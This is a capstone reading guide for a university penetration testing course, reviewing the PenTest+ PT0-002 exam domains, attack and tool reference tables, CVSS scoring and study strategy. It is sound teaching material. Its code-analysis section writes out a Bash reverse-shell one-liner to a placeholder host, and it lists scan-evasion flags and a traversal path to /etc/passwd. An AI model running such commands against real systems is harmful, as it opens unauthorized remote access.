# Reading Guide: Module 16 — PenTest+ PT0-002 Exam Preparation and Capstone

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

---

## Overview

This final module provides a comprehensive review of all five PT0-002 exam domains, exam strategy guidance, and a synthesis of course themes. Students who have mastered the content of Modules 1–15 will find this module reinforces and connects prior learning. Students who identified gaps in earlier modules should use this guide to target additional study.

---

## Learning Objectives

After completing this module, students will be able to:

1. Identify the content and weight of all five PT0-002 exam domains.
2. Apply the exam question framework to scenario-based questions across all domains.
3. Match tools to use cases and testing phases with confidence.
4. Calculate CVSS 3.1 scores and identify qualitative severity ratings.
5. Demonstrate understanding of authorization, legal, and ethical principles across all testing scenarios.
6. Develop a personal study plan targeting identified knowledge gaps.

---

## Section 1: Domain 1 — Planning and Scoping (14%)

### 1.1 Governance, Risk, and Compliance

Industry frameworks and regulations covered in the exam:

| Framework/Standard | Sector | Key Requirement |
|-------------------|--------|-----------------|
| PCI DSS | Payment card | Requirement 11: External/internal penetration testing |
| HIPAA | Healthcare | 45 CFR § 164.312: Technical safeguards |
| NIST SP 800-115 | Federal/general | Technical Guide to Information Security Testing |
| ISO/IEC 27001 | General | Annex A: Security controls including assessment |
| GLBA | Financial | Customer financial information protection |
| FERPA | Education | Student record privacy |
| SOX | Public companies | Internal financial control integrity |

### 1.2 Scope Definition Vocabulary

Know these terms precisely:

**Target scope:** The specific systems, networks, and applications authorized for testing.

**Black box:** Tester has no prior knowledge of the target environment.

**Gray box:** Tester has partial knowledge (network diagrams, low-privilege credentials).

**White box:** Tester has full knowledge (architecture diagrams, source code, all credentials).

**Rules of Engagement:** Technical document defining testing hours, permitted techniques, prohibited techniques, and notification procedures.

**Scope creep:** Testing systems outside the defined scope — a contractual and legal violation.

**Third-party authorization:** Testing systems operated by parties other than the client requires that party's authorization.

### 1.3 Ethical Requirements

The PT0-002 consistently tests ethical judgment. The correct action is always:

- Seek authorization before testing
- Stop testing when scope is exceeded or authorization is uncertain
- Report findings accurately without inflation or deflation
- Maintain confidentiality of client data
- Follow responsible disclosure for findings outside scope

---

## Section 2: Domain 2 — Information Gathering and Vulnerability Scanning (22%)

### 2.1 Passive Reconnaissance Sources

| Source | Information Obtained | Tool/Method |
|--------|---------------------|------------|
| WHOIS | Registrant, dates, nameservers | whois command |
| DNS | A, AAAA, MX, TXT, NS records | dig, nslookup |
| DNS Zone Transfer | All DNS records if AXFR enabled | dig axfr |
| Certificate Transparency | Subdomains via issued certificates | crt.sh |
| Shodan | Internet-exposed services | shodan.io |
| LinkedIn | Org hierarchy, technologies | Browser |
| Google Dorking | Sensitive files, admin pages | Google operators |
| theHarvester | Emails, subdomains, names | theHarvester tool |

### 2.2 Active Reconnaissance — Nmap Flags

| Flag | Function |
|------|---------|
| `-sS` | TCP SYN (stealth) scan |
| `-sT` | TCP connect scan (requires full connection) |
| `-sU` | UDP scan |
| `-sV` | Service version detection |
| `-sC` | Default NSE scripts |
| `-A` | OS detection + version + script + traceroute |
| `-p-` | All 65,535 ports |
| `-p 80,443` | Specific ports |
| `-T0` to `-T5` | Timing (0=paranoid, 5=insane) |
| `-oA` | Output all formats |
| `-D RND:10` | Decoy sources |
| `-f` | Fragment packets |
| `--source-port 53` | Spoof source port |

### 2.3 Vulnerability Scanning Concepts

Authenticated vs. unauthenticated scanning: Authenticated scans use credentials to perform deeper assessment. They find local vulnerabilities, configuration issues, and patch levels that unauthenticated scans miss.

False positive: Scanner reports a vulnerability that does not exist. Must be verified before reporting.

False negative: Scanner misses a real vulnerability. Manual testing supplements automated scanning to reduce false negatives.

Credentialed scan privilege levels: Local admin or root provides the most complete scan results. Service accounts provide intermediate results.

---

## Section 3: Domain 3 — Attacks and Exploits (30%)

### 3.1 Web Application Attack Reference

| Attack | Description | Key Tool |
|--------|-------------|----------|
| SQL Injection | Manipulate SQL queries via user input | SQLMap, Burp Suite |
| XSS (Reflected) | Script in URL parameter, executed in victim's browser | Burp Suite |
| XSS (Stored) | Script stored in database, executed for all viewers | Manual, Burp |
| CSRF | Force authenticated user to perform actions | Manual |
| SSRF | Make server request internal resources | Burp Suite |
| XXE | XML external entity injection | Burp Suite |
| IDOR | Access other users' resources via ID manipulation | Manual, Burp |
| File Upload | Upload malicious files (webshell) | Manual, Burp |
| Directory Traversal | Read arbitrary files via ../../../etc/passwd | Manual, Burp |
| Command Injection | Execute OS commands via application input | Manual |

### 3.2 Windows Active Directory Attack Reference

| Attack | Description | Key Tool |
|--------|-------------|---------|
| Pass-the-Hash | Use NTLM hash instead of password | Impacket, CrackMapExec |
| Pass-the-Ticket | Forge/reuse Kerberos tickets | Mimikatz, Impacket |
| Kerberoasting | Request service ticket, crack offline | Rubeus, Impacket |
| AS-REP Roasting | Exploit accounts without pre-auth | Impacket GetNPUsers |
| LLMNR Poisoning | Capture NTLM hashes from broadcast | Responder |
| DCSync | Replicate domain credentials | Mimikatz dcsync |
| BloodHound | Map AD attack paths | BloodHound, SharpHound |
| Golden Ticket | Forge Kerberos TGT with krbtgt hash | Mimikatz |

### 3.3 Post-Exploitation Techniques

Persistence mechanisms (Windows): Registry Run keys, Scheduled Tasks, Service installation, DLL hijacking, WMI subscriptions.

Privilege escalation (Windows): Unquoted service paths, writable service binaries, AlwaysInstallElevated, token impersonation.

Privilege escalation (Linux): SUID/SGID binaries, writable cron jobs, sudo misconfigurations, kernel exploits.

Lateral movement: SMB-based (PsExec, CrackMapExec), WMI, PowerShell Remoting, RDP, Pass-the-Hash.

Data exfiltration: HTTP/S to C2, DNS tunneling, ICMP tunneling, email.

---

## Section 4: Domain 4 — Reporting and Communication (16%)

### 4.1 CVSS 3.1 Quick Reference

Qualitative ratings:

- Critical: 9.0–10.0
- High: 7.0–8.9
- Medium: 4.0–6.9
- Low: 0.1–3.9
- None: 0.0

High-frequency scoring patterns:

**Remote unauthenticated RCE:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 Critical

**Stored XSS:** AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N ≈ 5.4 Medium

**Local privilege escalation:** AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8 High

**Physical badge cloning:** AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 6.8 Medium

### 4.2 Finding Components Checklist

Every finding must have:

- [ ] Title (descriptive, specific)
- [ ] Risk Rating (Critical/High/Medium/Low)
- [ ] CVSS Score with vector string
- [ ] Description (what, where, how confirmed)
- [ ] Evidence (screenshot/output with timestamp)
- [ ] Impact (business impact, not just technical)
- [ ] Affected Assets (specific identifiers)
- [ ] Remediation — Immediate (0–30 days)
- [ ] Remediation — Long-term (30–90+ days)
- [ ] References (CVE, standards)

---

## Section 5: Domain 5 — Tools and Code Analysis (18%)

### 5.1 Comprehensive Tool Reference

| Tool | Category | Primary Use |
|------|----------|------------|
| Nmap | Recon | Port scanning, service detection |
| Masscan | Recon | High-speed port scanning |
| theHarvester | Recon | OSINT aggregation |
| Maltego | Recon | Link analysis visualization |
| Recon-ng | Recon | Modular OSINT framework |
| Nikto | Web | Web server vulnerability scanning |
| Burp Suite | Web | Manual web/API testing |
| OWASP ZAP | Web | Automated web scanning |
| SQLMap | Web | Automated SQL injection |
| WFuzz/Gobuster | Web | Directory brute-forcing |
| Metasploit | Exploitation | Exploitation framework |
| Mimikatz | Credentials | Windows credential extraction |
| BloodHound | AD | AD attack path visualization |
| Responder | Credentials | LLMNR/NBT-NS poisoning |
| Impacket | AD | Windows protocol toolkit |
| CrackMapExec | AD | AD enumeration/exploitation |
| Aircrack-ng | Wireless | WPA2 PSK cracking |
| Airodump-ng | Wireless | 802.11 packet capture |
| Aireplay-ng | Wireless | Frame injection/deauth |
| Hashcat | Credentials | GPU-accelerated hash cracking |
| John the Ripper | Credentials | CPU hash cracking |
| Hydra | Credentials | Online brute-force |
| GoPhish | Social Eng | Phishing campaign management |
| Proxmark3 | Physical | RFID assessment |
| Wireshark | Analysis | Packet analysis |
| Volatility | Forensics | Memory forensics |
| Pacu | Cloud | AWS exploitation |
| ScoutSuite | Cloud | Multi-cloud audit |
| MobSF | Mobile | Mobile app analysis |
| Frida | Mobile/IoT | Dynamic instrumentation |
| Binwalk | IoT | Firmware extraction |

### 5.2 Code Analysis — Common Script Patterns

The PT0-002 may present short scripts for analysis. Know these patterns:

**Reverse shell (Bash):** `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`

**Python port scanner:** Socket connect on iterating ports.

**PowerShell credential extraction:** `Invoke-Mimikatz`, `Get-Credential`.

**Python web request with auth bypass:** Requests library with modified headers.

For each script, identify: purpose, target, how it could be used offensively, and how to detect or block it.

---

## Section 6: Exam Preparation Plan

### 6.1 Domain Priority Recommendations

Based on exam weight distribution, recommended study time allocation:

| Domain | Weight | Recommended Study % |
|--------|--------|---------------------|
| 3 — Attacks and Exploits | 30% | 35% |
| 2 — Recon and Vulnerability Scanning | 22% | 20% |
| 5 — Tools and Code Analysis | 18% | 20% |
| 4 — Reporting and Communication | 16% | 15% |
| 1 — Planning and Scoping | 14% | 10% |

Note that Domain 1 is well-covered by course readings and labs. Domain 3 requires the most investment but is most directly supported by hands-on lab experience.

### 6.2 Additional Practice Resources

- CompTIA CertMaster Practice: Official practice questions
- Professor Messer PT0-002 Study Guide: Comprehensive free online study guide
- TryHackMe PenTest+ learning path: Hands-on scenarios
- Hack The Box: OSCP-adjacent labs, excellent Domain 3 preparation
- Jason Dion Udemy Course: PT0-002 practice exams
- Official PT0-002 Exam Objectives document: Free from CompTIA website — review every bullet point

### 6.3 Final Week Strategy

Week before the exam:

- Review the full PT0-002 objectives document
- Complete one full-length practice exam per day
- For each wrong answer, research the correct answer until you understand why
- Review tool-to-use-case mappings daily (the table in Section 5.1)
- Practice CVSS scoring with 5–10 scenarios daily
- Do not attempt to learn new material — reinforce what you know

Day before the exam:

- Light review only — no new material
- Ensure logistics are confirmed: exam location (testing center or at-home), required ID, scheduling confirmation
- Rest — fatigue significantly degrades test performance

---

## Key Terms Review

Review all key terms from Modules 1–15. The following are highest-frequency on PT0-002:

**Pentest methodology phases:** Planning → Recon → Scanning → Exploitation → Post-exploitation → Reporting

**OWASP Top 10 categories:** Injection, Broken Auth, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Using Vulnerable Components, Insufficient Logging

**OWASP API Top 10:** BOLA, Broken Auth, BOPLA, Resource Consumption, BFLA, Business Flow Abuse, SSRF, Misconfiguration, Improper Inventory, Unsafe API Consumption

**Kerberos ticket types:** TGT (Ticket Granting Ticket), TGS (Ticket Granting Service ticket)

**Windows NTLM hash:** Used in pass-the-hash, captured by Responder, cracked by Hashcat

---

## Review Questions

1. List the five PT0-002 domains and their percentage weights. Which domain has the highest weight and why does that make sense?

2. A scenario describes an attacker using `Invoke-Mimikatz` to extract credentials from LSASS memory. Which PT0-002 domain does this fall under, and what defensive control would prevent this specific attack?

3. Differentiate between Kerberoasting and AS-REP Roasting. Which Impacket tool enables each, and what is the prerequisite condition for each attack?

4. A scan finds a web application with a vulnerable `/xmlrpc.php` endpoint. Which OWASP Top 10 category applies if the vulnerability involves XML external entity injection? What is the CVSS base score formula input for a confirmed XXE that reads `/etc/passwd` from a Linux server?

5. Write a 200-word capstone reflection: What is the single most important professional obligation of a penetration tester, and how has this course shaped your understanding of that obligation?

---

## References

- CompTIA PenTest+ PT0-002 Exam Objectives: https://comptia.org/training/resources/exam-objectives
- Professor Messer PenTest+ Study Guide: https://www.professormesser.com/pentest/pt0-002
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP API Security Top 10: https://owasp.org/API-Security/
- NIST SP 800-115 Technical Guide to Information Security Testing: https://csrc.nist.gov/publications/detail/sp/800-115/final
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
